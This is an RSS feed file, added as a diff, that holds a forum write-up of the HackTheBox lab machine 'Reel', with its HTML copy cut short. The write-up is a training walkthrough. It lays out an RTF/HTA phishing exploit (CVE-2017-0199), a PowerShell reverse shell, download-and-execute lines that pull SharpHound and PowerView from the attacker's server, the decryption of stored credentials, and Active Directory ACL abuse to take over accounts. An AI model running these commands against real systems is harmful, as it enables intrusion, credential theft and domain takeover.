@@ -1,0 +1,1348 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>[HTB] SHELL AFFECT - Reel - WriteUp</title>
+    <link>https://d.clarkee.co.uk/t/htb-shell-affect-reel-writeup/12930</link>
+    <description>![grafik|690x242](upload://bNolujQq86vaHN3stPLBkHB5zgC.png) 
+
+
+Hey guys, 
+how are you doing?
+
+This is a writeup for the HackTheBox VM called &quot;Reel&quot;.
+At this topic, I will focus mainly on 
+**how to find the information you need** &amp;
+**how to work with the information you already have**
+to root this box.
+At the end of this topic, there will be a **challenge** for you which will require a little bit more than I explained in this writeup.
+
+
+## Table of contents
+```
+1. Enumeration
+2. FTP
+3. Exploitation Research
+4. RTF file creation
+5. HTA file creation
+6. Exploitation
+7. Local Enumeration
+8. Extract Password from an XML file
+9. SSH Login
+10. Enumeration with BloodHound
+11. SMB File Transfer
+12. BloodHound AD-Relationships
+13. Privilege Escalation using PowerView
+14. Challenge
+```
+
+## 1. Enumeration
+Enumeration is the key. That&#39;s always the first step we do. Get an overview of the target is the essential part.
+I like to scan with nmap only for open ports first because of service scans and script scans used by nmap could create much traffic. By creating to much traffic, it could happen that some ports will be shown as closed because of these scans will be blocked. 
+
+The method I use to scan for open ports looks like this:
+
+&gt; nmap 10.10.10.77 -Pn -n -p- --open -oN allports.nmap --stats-every 10s --max-retries 2 -T5
+
+\# _-Pn - Treat all hosts as online_
+\# _-n - Never do DNS resolution_
+\# _\-\-max-retries - Caps number of port scan probe retransmissions._
+\# _\-\-stats-every - Periodically prints a timing status message after each interval of *`&lt;time&gt;`* ._
+
+The result of this scan looks following:
+&gt; **PORT      STATE SERVICE**
+21/tcp    open  ftp
+22/tcp    open  ssh
+25/tcp    open  smtp
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  Microsoft-ds
+593/tcp   open  http-rpc-epmap
+49159/tcp open  unknown
+
+Another point why I like to use this method is because I can filter all these ports and declare them as a variable in bash.
+Something like this:
+
+&gt; PORTS=$(cat allports.nmap | grep tcp | cut -d&quot;/&quot; -f1 | tr &quot;\n&quot; &quot;,&quot; | sed &#39;s/.$//g&#39;)
+
+The output of this variable  looks than:
+&gt; echo $PORTS
+21,22,25,135,139,445,593,49159
+
+Now we can use the variable for further service &amp; script scans:
+&gt; nmap 10.10.10.77 -p$PORTS -sV -sC -oN services.nmap --stats-every 10s --max-retries 2	
+
+Results of the service and script scans:
+```
+PORT      STATE SERVICE      VERSION
+21/tcp    open  ftp          Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_05-29-18  12:19AM       &lt;DIR&gt;          documents
+| ftp-syst: 
+|_  SYST: Windows_NT
+22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
+|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
+|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
+25/tcp    open  smtp?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
+|     220 Mail Service ready
+|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
+|     220 Mail Service ready
+|     sequence of commands
+|     sequence of commands
+|   Hello: 
+|     220 Mail Service ready
+|     EHLO Invalid domain address.
+|   Help: 
+|     220 Mail Service ready
+|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+|   SIPOptions: 
+|     220 Mail Service ready
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|_    sequence of commands
+| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, 
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49159/tcp open  msrpc        Microsoft Windows RPC
+...
+Host script results:
+|_clock-skew: mean: -31m56s, deviation: 34m37s, median: -11m57s
+| smb-os-discovery: 
+|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
+|   Computer name: REEL
+|   NetBIOS computer name: REEL\x00
+|   Domain name: HTB.LOCAL
+|   Forest name: HTB.LOCAL
+|   FQDN: REEL.HTB.LOCAL
+|_  System time: 2019-04-08T06:59:23+01:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2019-04-08 07:59:25
+|_  start_date: 2019-04-08 06:36:42
+
+```
+
+Alright, what do we have so far?
+OS: Windows Server 2012 R2 Standard 9600 6.3
+System time is actual.
+Services:
+* FTP (Anonymous Login)
+* **OpenSSH (?)**
+* SMTP
+* MSRPC
+* SMBv2 (REEL.HTB.LOCAL)
+* MSRPC over HTTP (TCP 593)
+
+First thing what looks different is the **OpenSSH** service because Windows doesn&#39;t have SSH as default service.
+
+So here we can take a deeper look at it and see which banner we will get from this service.
+&gt; nc -nv 10.10.10.77 22
+
+![grafik|582x82](upload://rcnJnDSOsP0ZTNQx93QYzqXdNEf.png) 
+
+Ok. Not much interesting here. Let&#39;s take a look inside SMTP.
+There exist a few interesting tools we could use, but my favourites are **smtp-user-enum.py** and **ismtp**.
+
+But first, we should take a look which commands are allowed on this SMTP server:
+&gt; telnet 10.10.10.77 25
+
+![grafik|403x317](upload://x0gOdKj0d9H7HUuT4xAXpXtF3gQ.png) 
+
+Now we know that the **VRFY** command is disallowed and it looks like we won&#39;t be able to enumerate some users successfully. The reason for this is the reply for the **RCPT TO** command I typed before. 
+If a username that doesn&#39;t exist will be entered (**idontexist**) and the server replies with a **250** instead of **550** response code it seems to be well configured to prevent user enumeration.
+
+A good reference for **SMTP commands** you can find [here](http://www.samlogic.net/articles/smtp-commands-reference.htm).
+Thanks **Mika Larramo** for this!
+
+So even if we use our tools we won&#39;t give any useful result:
+
+**ismtp**
+&gt; ismtp -h 10.10.10.77 -e /usr/share/seclists/Usernames/top-usernames-shortlist.txt -l 3
+
+**smtp-user-enum.py**
+&gt; smtp-user-enum -u administrator -t 10.10.10.77 -M VRFY
+
+
+## 2. FTP
+Next step.
+As you noticed - Anonymous login is enabled for the FTP service. Let us use it to enumerate the machine a little bit more.
+
+Credentials used: 
+`anonymous:anon`
+&gt; ftp 10.10.10.77
+
+![grafik|681x432](upload://3Z2a5r7Amz5R8u0lUMolV4l6RSF.png) 
+
+Here we discovered some interesting files. There exist a few methods you can download them. 
+Because we already logged in I will use:
+&gt; ftp&gt; mget \*.*
+
+Otherwise, you can download all these files with wget:
+&gt; wget -m --no-passive-ftp ftp://anonymous:anon@10.10.10.77
+
+![grafik|676x116](upload://aZMQdwpqNzQB2Y1citOVdZxgeko.png) 
+
+Alright, let&#39;s analyse the files.
+
+**AppLocker.docx**
+For this file, I used LibreOffice Writer to take a look at how it does look.
+
+![grafik|690x353](upload://526EqBdwlEuPGbUAcUFsK4gEtTs.png) 
+
+Interesting. It gives us a little bit of information about the procedure. Let us look a little bit deeper:
+
+
+&gt; exiftool AppLocker.docx
+&gt; strings AppLocker.docx
+
+![grafik|537x499](upload://6wHkkEkRm6l9y8dYbnDSbsdX0Ea.png) 
+
+Ok. Nothing interesting here.
+
+**readme.txt**
+
+&gt; cat readme.txt
+
+Output:
+&gt; please email me any rtf format procedures - I&#39;ll review and convert. new format / converted documents will be saved here.
+
+
+That looks interesting. What do we see here?
+* `&quot;email me&quot;`
+* `rtf format`
+* `&quot;I will review and convert&quot;`
+* `converted documents will be saved here`
+
+Ok. What do we need?
+Do we have an email address? No.
+RTF format file?
+
+From here you&#39;re starting to think about `how should I found out a valid email address if SMTP doesn&#39;t return in/valid usernames?`
+
+Stop.
+You have to still organised. Follow your methodology even if you don&#39;t have one yet. Your goal is to get an overview of your target. Before you start to go deeper enumeration finish your process you started. 
+What did we do?
+Did we extract all information from all files? - I don&#39;t think so.
+
+**&#39;Windows Event Forwarding.docx&#39;**
+Also here I tried to open this document to take a look at it but...
+
+![grafik|690x466](upload://AqHDi0jkBmDKJmO1RgzeO0RxEj6.png) 
+
+Now it could be dangerous to start the repair process because LibreOffice might overwrite some data inside it which could be relevant for us. Additionally, it could fail too.
+
+![grafik|499x152](upload://icxmUrdbtIIYB626YFbriIBVEdM.png) 
+
+&gt; exiftool Windows\ Event\ Forwarding.docx
+
+![grafik|614x500](upload://iBDj04K8BFJAimQXmxSwnEhoJi4.png) 
+
+It becomes interesting.
+In this document was stored the email address of the creator.
+&gt; nico@megabank.com 
+
+I marked all information which should be noted for later enumeration. You should write it down because you won&#39;t know which data will be required to root this box later.
+
+## 3. Exploitation Research
+Back to our questions:
+Do we have an email address? **Yes**.
+RTF format file?
+If there is a file extension, you don&#39;t know then google for it.
+
+&gt; Google: rtf file
+
+This search will lead you to https://fileinfo.com/extension/rtf.
+&gt; An RTF file is a common text file format that supports &quot;rich text.&quot; It includes several types of text formatting, such as bold type, italics, different fonts and font sizes, and custom tab settings. RTF files also support objects and images, such as .JPG and .PNG files, saved within the text file.
+
+Beneficial information for us. Now let&#39;s search for exploits.
+
+&gt; Google: rtf exploit
+
+The first result will show you an exploit toolkit from bhdresh
+
+https://github.com/bhdresh/CVE-2017-0199
+
+with a full description of the exploit and usage. We will use his script to generate our malicious RTF file.
+
+Here you should read a little bit more about this vulnerability.
+This is important. Not for me. It&#39;s crucial for **you**.
+You should understand the attack structure and how it will look like.
+
+I will come back to the attack structure later.
+
+
+## 4. RTF file creation
+Let us create our RTF file.
+&gt; python cve-2017-0199_toolkit.py -M gen -w sha.rtf -t RTF -u http://\&lt;attacker&gt;/sha.hta
+
+![grafik|690x70](upload://rR18FUMd8D8jGNdh0A7RbtZmxl2.png) 
+
+Here you can notice that we need another file with a .hta extension?
+And again, what is HTA?
+
+Definition from https://fileinfo.com/extension/hta : 
+ 
+&gt; Program that can be run from an HTML document; an executable file that contains hypertext code and may also contain VBScript or JScript code; can be created by simply changing the file extension of an .HTM file to an &quot;.HTA&quot; extension; run by the Microsoft HTML Application Host (Mshta.exe).
+
+And again. Crucial information we can use.
+
+## 5. HTA file creation
+There exist multiple methods to create a malicious HTA file.
+We could use **unicorn.py** or **Metasploit**, but I will use a PowerShell script from **Nishang**.
+
+Therefore you will need to install PowerShell on Kali, or you execute it on your Windows machine. I will use **pwsh** on Kali here.
+&gt; cd /usr/share/nishang/Client/OUT-HTA.ps1
+&gt; pwsh
+
+![grafik|558x416](upload://f7qCJVVCusjUHeZ1yqx2ijRlPj6.png) 
+
+And this point there exists a little bug. But I think you will be able to solve it on your own. ;)
+
+![grafik|690x79](upload://vit6wHk2vpRqeG7X4CI0SxeBpt4.png) 
+
+Do you understand what we&#39;re doing right now? Why did we create an RTF file and HTA file? And why we will create a PS1 file in the next step?
+At this point, when you feel like you lost the overview, then you should take a step back and return to the point where you understood the full structure of your target.
+
+Now we will create our PS1 reverse shell.
+How will the attack look like?
+
+First, we should exactly know what we have:
+1. RTF file with a redirection to our HTA file.
+Send Email w/ RTF -&gt; HTA
+2. HTA file with a redirection to our PS1 file (Reverse Shell)
+Send Email w/ RTF -&gt; HTA -&gt; PS1 
+
+**PS1 Reverse Shell**
+Also here I will use a script from **Nishang**.
+It&#39;s stored by default in `/usr/share/nishang/Shells/` directory.
+
+&gt; cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 /var/www/html/sha.ps1
+
+Now we have to edit out reverse shell to make it executable.
+
+![grafik|690x245](upload://mp43hx1zFKpP1M3dcCWcE72AINF.png) 
+
+Copy the marked PS line at the end of the script and edit it. It should look something like this:
+
+![grafik|690x279](upload://zZznHySPDunOonalxJcocd3PKFf.png) 
+
+
+## 6. Exploitation
+Now let us send the email and hope that he will open it.
+But before we send the email, we should turn on our Web server and our listener. 
+
+Make sure you run the web server and the **sendemail** SMTP client from the directory where the files we created are stored.
+
+**Web server**
+For the web server, you can use Python2 or Python3, ,but I will use Apache.
+
+For Python2:
+&gt; python -m SimpleHTTPServer \&lt;Port&gt;
+
+For Python3:
+&gt; python3 -m http.server \&lt;Port&gt;
+
+Apache:
+service apache2 start
+
+**Reverse Shell Listener**:
+&gt; nc -nlvp 2202
+
+Now the exploit:
+
+&gt; sendemail -f shelly@megabank.com -t nico@megabank.com -u Update -m &quot;Please update RTF file.&quot; -a sha.rtf -s 10.10.10.77
+
+It could take a moment before you get a reverse shell back.
+Additionally, you can run **tcpdump** or **WireShark** to capture the traffic and make sure that everything looks like we want.
+
+Then it should look like the following:
+
+![grafik|690x263](upload://55CvphVM3QKVhB2UkpJCCpFXh8P.png) 
+
+
+## 7. Local Enumeration
+Great! We&#39;ve got a reverse shell. Let us do some basic enumeration stuff.
+&gt; whoami
+&gt; net users
+&gt; net groups
+
+![grafik|400x500](upload://yPFAKfOhkoWhYcSmcfslnDDpO6D.png) 
+
+&gt; systeminfo
+
+Systeminfo gives us a lot of information like:
+OS: **Microsoft Windows Server 2012 R2 Standard**
+OS Version: **6.3.9600 N/A Build 9600**
+OS Configuration: **Primary Domain Controller**
+System Type: **x64-based PC**
+Hotfix(s): **95 Hotfix(s) Installed.**
+* \[1]: KB2894852
+* ...
+* \[95]: KB4054519
+
+This hotfix(s) means that the server last update is from 12. Dec 2017. So it&#39;s possible to find some local privilege exploits. We add this step to our To-Do-List. 
+
+It&#39;s always interesting what the user we&#39;ve access to has in his home directory.
+
+![grafik|517x374](upload://x9hc67oMSH8FTz5NWMQFQuyjBkf.png) 
+
+Ok. No different directories here. Let&#39;s look at his desktop.
+
+![grafik|496x208](upload://mpyuTXSZFYcetqmwRr2dHMz1rwO.png) 
+
+And here we found our **user.txt**.
+
+&gt; type user.txt
+
+![grafik|367x43](upload://b4rdJhITLR9k0gDmG1DRciV7WZ5.png) 
+
+But the **creds.xml** looks very interesting. 
+
+![grafik|690x176](upload://i7vSJmL7d0j7Gv9t8vosUxKTmDp.png) 
+
+What do we have here?
+1. XML file
+2. Objs Version 1.1.0.1
+3. PSCredential
+4. Username: Tom
+5. Password: \&lt;hash&gt;
+
+
+
+## 8. Extract Password from an XML file
+
+The main question here is:
+&gt; how can we extract the password from this file?
+
+Ask Google:
+&gt; Google: extract password from pscredential xml
+
+On the first page you will find this post:
+https://stackoverflow.com/questions/40029235/save-pscredential-in-the-file
+
+![grafik|690x264,75%](upload://aMwmr12ImBv0tUkEWsnmiwf9vcZ.png) 
+
+&gt; PS C:\Users\nico\Desktop&gt; $credential = import-clixml -path cred.xml
+
+
+Now we are using this XML file but how to extract the encrypted password?
+
+&gt; Google: decrypt password from pscredential
+
+https://stackoverflow.com/questions/7433178/powershell-get-credential-decode-password
+
+![grafik|690x226,75%](upload://5wyRS7GkIr2fZuDtJ753lKlbGIN.png) 
+
+Ok. Let us give a try, but I will change the command for a better output:
+&gt; PS C:\Users\nico\Desktop&gt; $credential.GetNetworkCredential() | fl
+
+![grafik|627x159](upload://bbiQ3R2WrWQ8yEblRMjWXpPUNB3.png) 
+
+Great! We&#39;ve got the decrypted password for the user Tom.
+
+
+## 9. SSH Login
+Now lets got to SSH, and we will use the credentials to log in.
+
+![grafik|485x140](upload://5cDEqsGGEiHEM9T0sM5wZm75MLG.png) 
+
+I want to take a look at the home directory of the user **Tom**.
+
+![grafik|469x480](upload://lhFhL6wB1l4nGhy9ZhuXvz4LWLw.png) 
+
+What is inside the **note.txt**?
+&gt; type note.txt
+
+![grafik|690x89](upload://dCZb0WvcapuE3r9bxDZrCbKkQpP.png) 
+
+It seems they didn&#39;t run the Cypher query against other groups. So maybe there exist a way to escalate our privileges by using another path.
+If you don&#39;t know what BloodHound is or you never worked with it, I highly recommend you to search for tutorials and to try it out.
+
+## 10. Enumeration with BloodHound
+So we want to use BloodHound. I will copy **SharpHound.ps1** to my Web servers directory. Then we will be able to download it to the &#39;Reel&#39; machine by using **Tom** and store the script into memory. 
+&gt; cp /opt/BloodHound/Ingestors/SharpHound.ps1 /var/www/html/
+
+Before we run it, we should take a look at it.
+This script has a function called **Invoke-BloodHound** with a **-CollectionMethod** parameter.
+
+![grafik|690x456](upload://nnOH7T3SopLtOFqtsuLTlWrZZo.png) 
+
+Let&#39;s start PowerShell and download the script:
+
+&gt; tom@REEL C:\Users\tom\Desktop\AD Audit&gt;powershell
+
+&gt; PS C:\Users\tom\Desktop\AD Audit&gt; IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.10/SharpHound.ps1&#39;)            
+
+&gt; PS C:\Users\tom\Desktop\AD Audit&gt; Invoke-BloodHound -CollectionMethod All                                                       
+
+![grafik|690x441](upload://gaDzev3XOBgCIjKrwhixcyHFK7O.png) 
+
+Now we want to download this ZIP file and import it to BloodHound.
+
+## 11. SMB File Transfer
+ I will use smbserver for the file transfer.
+
+&gt; impacket-smbserver SHELLAFFECT ./
+
+&gt; net view \\10.10.14.10
+
+&gt; cp .\20190411050731_BloodHound.zip \\\10.10.14.10\SHELLAFFECT\
+
+
+![grafik|690x270](upload://sWfZwlw0GoWI6c7dM3BdrHERkmp.png) 
+
+
+## 12. BloodHound AD-Relationships
+Because BloodHound is a JavaScript Application and is working Neo4j database with we have to start the **neo4j** database first.
+&gt; neo4j start
+
+It&#39;s possible that a warning with failure will appear where the **neo4j** will say that:
+&gt; WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
+/usr/share/neo4j/bin/neo4j line 451 /var/run/neo4j/neo4j.pid no such file or directory
+
+Just ignore that. It still working.
+
+![grafik|589x500](upload://nW0IAY3ii4h6Fxqb1ayic9Brgxr.png) 
+
+Here we can import the ZIP file just by drag &amp; drop.
+
+By selecting **Queries** -&gt; **Shortest Path to High Value Targets** you&#39;ll see a graph like this:
+
+![grafik|690x355](upload://au041OaxsR2B1O8UM6jU613zHRp.png) 
+
+Did you remember/note what we discovered before as user **nico** ?
+Then make a step back and retake a look.
+What could be relevant to us?
+
+I will show you what I mean:
+
+
+![grafik|365x493](upload://bZqi7RsPrcRWPq6HVQ2RCQyVHHa.png)
+
+ 
+
+That&#39;s the reason why you should always take notes. Taking notes is also an essential skill. It will make many things easier to find and will help you to create a great report at the end of a pentest. It&#39;s a skill that should always be practised.
+Also, it helps you keep an overview of your target.
+
+When you click on the **Pathfinding** icon, we can search for paths.
+
+![grafik|690x309](upload://xV1dpvOtwfaGTNpvo10MpzpAUkN.png) 
+
+![grafik|690x309](upload://jkv327uCAjQ688jGgUL6okHpCHN.png) 
+
+Now again, what do you see here?
+Which information can we use? Make notes. Write down all your ideas. Experiment. Try it out.
+
+## 13. Privilege Escalation using PowerView
+What do we see here?
+1. User: Tom
+2. User: Claire
+3. Group: Backup_Admins
+
+Is it everything?
+But there is a little bit more.
+
+4. **WriteOwner**
+5. **GenericWrite**
+6. **WriteDacl**
+
+But what is it? If you never heard about it, search for it.
+
+&gt; Google: writeowner active directory
+
+The first result will give the information you need. 
+
+![grafik|467x248](upload://swCrbhzCW5iW5ydrQ0E6QKTx7tJ.png) 
+https://adsecurity.org/?tag=writeowner
+
+Here is the summary:
+
+**WriteOwner** : Provides the ability to take ownership of an object. The owner of an object can gain full control rights on the object.
+
+**GenericWrite** : Provides write access to all properties.
+
+**WriteDacl** : Provides the ability to modify security on an object which can lead to Full Control of the object.
+
+I highly recommend reading these articles. They&#39;re well written and very educational. When you read it, you should notice that they used a PowerShell script called **PowerView**.
+
+We will use it too, and we copy it to our Web server directory.
+
+**\[!] Important Note**: Your PowerView.ps1 might be outdated. To download the newest one visit [Empire@Github](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1).
+
+After that, we can download it on the target machine.
+&gt; PS C:\Users\tom\Desktop&gt; IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.10/PowerView.ps1&#39;)                       
+
+Now we will modify the owner for a specified AD object from **Claire** to **Tom**:
+&gt; PS C:\Users\tom\Desktop&gt; Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                                              
+
+After that, we will add an ACL for a specific AD object for the domain principal.
+&gt; Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword -Verbose
+
+![grafik|690x158](upload://tOKE7r3NxxAwRnSEbbAwKUlv8bV.png) 
+
+Now we set the rights to reset the password for the user **Claire** who provides write access to all properties and the ability to modify security on an object which can lead Full Control of the object.
+
+Let&#39;s change the password. PowerView provides you with a function called **Set-DomainUserPassword** which we will use.
+But first, we have to define our new password for the user **Claire**:
+&gt; PS C:\Users\tom&gt; $ClairePassword = ConvertTo-SecureString &#39;Ultr4Pass!&#39; -AsPlainText -Force -Verbose                             
+
+&gt; PS C:\Users\tom&gt; Set-DomainUserPassword -Identity claire -AccountPassword $ClairePassword -Verbose                              
+
+![grafik|690x70](upload://gKFkOPSoftQZttS1bXjzmV7zCgq.png) 
+
+Also, we should add the user **Claire** to the domain group &#39;Backup_Admins&#39; by using the **Add-DomainGroupMember** function:
+
+&gt; $Cred = New-Object System.Management.Automation.PSCredential(&#39;HTB\claire&#39;, $ClairePassword)
+
+&gt; Add-DomainGroupMember -Identity &#39;Backup_Admins&#39; -Members &#39;claire&#39; -Credential $Cred
+
+![grafik|690x40](upload://ke6CqpcPXp1eGU2btyquY37VqIc.png) 
+
+And now we can use our new credentials to log in through SSH with the user **Claire**:
+
+&gt; ssh claire@10.10.10.77
+
+![grafik|648x498](upload://zlvR8lfUwRvbisJXUcA3QOwlcfb.png) 
+
+As always I enumerate the home directory of the user first. Then I try to take a look at the directories of other users. Previously we successfully added **Claire** to the domain group **Backup_Admins**. So we should be able to take a look at the home directory of the Administrator. There is an interesting folder called **Backup Scripts**. This directory has some PowerShell scripts which may reveal some useful information:
+
+![grafik|690x399](upload://mjdhSniltYEdlnyMIYAvD27O3Lg.png) 
+
+We found admin credentials in this script. Now we can try to login by using them and read the **root.txt**.
+
+![grafik|625x500](upload://lxegpnQu4nEI1zgStXvX1Itl6W9.png) 
+
+By the way, there is another way to get the information you need.
+If you right-click at **WriteOwner** on the path from user **Tom** to **Claire** you will open a windows with a **Help** page.
+![grafik|378x310](upload://zWEVPejcH2cKwU2LnUaApzGTrQa.png) 
+
+If you open this Help page, you will see the information you need. These are the steps we did just additionally we improved our research skills.
+
+![grafik|567x487](upload://bUNMofKmiuPfZR4hHj04hGDdzA4.png) 
+
+
+## 14. Challenge
+Escalate your privileges by using the user **Nico** instead of **Tom** and create a new graph with modified ownership.
+
+I highly recommend watching [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) videos on YouTube!
+_____
+&gt; YouTube video: https://www.youtube.com/watch?v=Xq2EQRfj3Gs
+
+Best regards,
+Cry0l1t3
+https://0x00sec.s3.amazonaws.com/original/2X/2/27a1e485297c69c94c88fe38429dddd5c839d998.png</description>
+    
+    <lastBuildDate>Sun, 14 Apr 2019 09:32:46 +0000</lastBuildDate>
+    <category>Hackthebox Writeups</category>
+    <atom:link href="https://d.clarkee.co.uk/t/htb-shell-affect-reel-writeup/12930.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>[HTB] SHELL AFFECT - Reel - WriteUp</title>
+        <dc:creator><![CDATA[Cry0l1t3]]></dc:creator>
+        <description><![CDATA[
+            <p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/5/52ad40e8b33e8667c3c4f3f6ae18a37c334240da.png" data-download-href="/uploads/short-url/bNolujQq86vaHN3stPLBkHB5zgC.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/52ad40e8b33e8667c3c4f3f6ae18a37c334240da.png" alt="grafik" data-base62-sha1="bNolujQq86vaHN3stPLBkHB5zgC" width="690" height="242"></a></div><p></p>
+<p>Hey guys,<br>
+how are you doing?</p>
+<p>This is a writeup for the HackTheBox VM called “Reel”.<br>
+At this topic, I will focus mainly on<br>
+<strong>how to find the information you need</strong> &amp;<br>
+<strong>how to work with the information you already have</strong><br>
+to root this box.<br>
+At the end of this topic, there will be a <strong>challenge</strong> for you which will require a little bit more than I explained in this writeup.</p>
+<h2><a name="p-39495-table-of-contents-1" class="anchor" href="https://d.clarkee.co.uk#p-39495-table-of-contents-1"></a>Table of contents</h2>
+<pre><code class="lang-auto">1. Enumeration
+2. FTP
+3. Exploitation Research
+4. RTF file creation
+5. HTA file creation
+6. Exploitation
+7. Local Enumeration
+8. Extract Password from an XML file
+9. SSH Login
+10. Enumeration with BloodHound
+11. SMB File Transfer
+12. BloodHound AD-Relationships
+13. Privilege Escalation using PowerView
+14. Challenge
+</code></pre>
+<h2><a name="p-39495-h-1-enumeration-2" class="anchor" href="https://d.clarkee.co.uk#p-39495-h-1-enumeration-2"></a>1. Enumeration</h2>
+<p>Enumeration is the key. That’s always the first step we do. Get an overview of the target is the essential part.<br>
+I like to scan with nmap only for open ports first because of service scans and script scans used by nmap could create much traffic. By creating to much traffic, it could happen that some ports will be shown as closed because of these scans will be blocked.</p>
+<p>The method I use to scan for open ports looks like this:</p>
+<blockquote>
+<p>nmap 10.10.10.77 -Pn -n -p- --open -oN allports.nmap --stats-every 10s --max-retries 2 -T5</p>
+</blockquote>
+<p># <em>-Pn - Treat all hosts as online</em><br>
+# <em>-n - Never do DNS resolution</em><br>
+# <em>--max-retries - Caps number of port scan probe retransmissions.</em><br>
+# <em>--stats-every - Periodically prints a timing status message after each interval of <em><code>&lt;time&gt;</code></em> .</em></p>
+<p>The result of this scan looks following:</p>
+<blockquote>
+<p><strong>PORT      STATE SERVICE</strong><br>
+21/tcp    open  ftp<br>
+22/tcp    open  ssh<br>
+25/tcp    open  smtp<br>
+135/tcp   open  msrpc<br>
+139/tcp   open  netbios-ssn<br>
+445/tcp   open  Microsoft-ds<br>
+593/tcp   open  http-rpc-epmap<br>
+49159/tcp open  unknown</p>
+</blockquote>
+<p>Another point why I like to use this method is because I can filter all these ports and declare them as a variable in bash.<br>
+Something like this:</p>
+<blockquote>
+<p>PORTS=$(cat allports.nmap | grep tcp | cut -d"/" -f1 | tr “\n” “,” | sed ‘s/.$//g’)</p>
+</blockquote>
+<p>The output of this variable  looks than:</p>
+<blockquote>
+<p>echo $PORTS<br>
+21,22,25,135,139,445,593,49159</p>
+</blockquote>
+<p>Now we can use the variable for further service &amp; script scans:</p>
+<blockquote>
+<p>nmap 10.10.10.77 -p$PORTS -sV -sC -oN services.nmap --stats-every 10s --max-retries 2</p>
+</blockquote>
+<p>Results of the service and script scans:</p>
+<pre><code class="lang-auto">PORT      STATE SERVICE      VERSION
+21/tcp    open  ftp          Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_05-29-18  12:19AM       &lt;DIR&gt;          documents
+| ftp-syst: 
+|_  SYST: Windows_NT
+22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
+|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
+|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
+25/tcp    open  smtp?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
+|     220 Mail Service ready
+|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
+|     220 Mail Service ready
+|     sequence of commands
+|     sequence of commands
+|   Hello: 
+|     220 Mail Service ready
+|     EHLO Invalid domain address.
+|   Help: 
+|     220 Mail Service ready
+|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+|   SIPOptions: 
+|     220 Mail Service ready
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|_    sequence of commands
+| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, 
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49159/tcp open  msrpc        Microsoft Windows RPC
+...
+Host script results:
+|_clock-skew: mean: -31m56s, deviation: 34m37s, median: -11m57s
+| smb-os-discovery: 
+|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
